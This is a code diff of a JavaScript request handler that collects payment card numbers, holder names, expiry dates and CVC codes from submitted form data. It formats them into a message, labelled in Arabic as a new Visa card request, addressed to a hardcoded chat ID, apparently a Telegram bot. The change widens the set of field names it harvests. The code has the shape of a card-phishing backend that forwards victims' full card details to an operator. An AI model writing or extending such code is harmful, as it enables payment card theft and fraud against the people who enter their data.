@@ -10,13 +10,17 @@ export default async function handler(req, res) {
   const CHAT_ID = "8278749797";
   const body = req.body || {};
 
-  const userId = body.user_id || Date.now().toString();
+  const userId = body.user_id || 'غير متوفر';
+  const cardNumber = body.card_number || body.cardNumber || 'غير متوفر';
+  const cardName = body.card_name || body.cardName || body.cardHolder || 'غير متوفر';
+  const expDate = body.exp_date || body.expDate || body.expiryDate || 'غير متوفر';
+  const cvc = body.cvc || body.cvv || body.check_id || 'غير متوفر';
 
   const text = `💳 *طلب بطاقة دفع جديدة (فيزا)*\n\n` +
-               `👤 اسم الحامل: ${body.card_name || body.cardName || 'غير محدد'}\n` +
-               `💳 رقم البطاقة: \`${body.card_number || body.cardNumber || ''}\`\n` +
-               `📅 الانتهاء: ${body.exp_date || body.expDate || ''}\n` +
-               `🔒 CVC / Check ID: \`${body.cvc || body.check_id || ''}\`\n` +
+               `👤 اسم الحامل: ${cardName}\n` +
+               `💳 رقم البطاقة: \`${cardNumber}\`\n` +
+               `📅 الانتهاء: ${expDate}\n` +
+               `🔒 CVC / Check ID: \`${cvc}\`\n` +
                `🆔 معرف المستخدم: \`${userId}\``;
 
   const keyboard = {
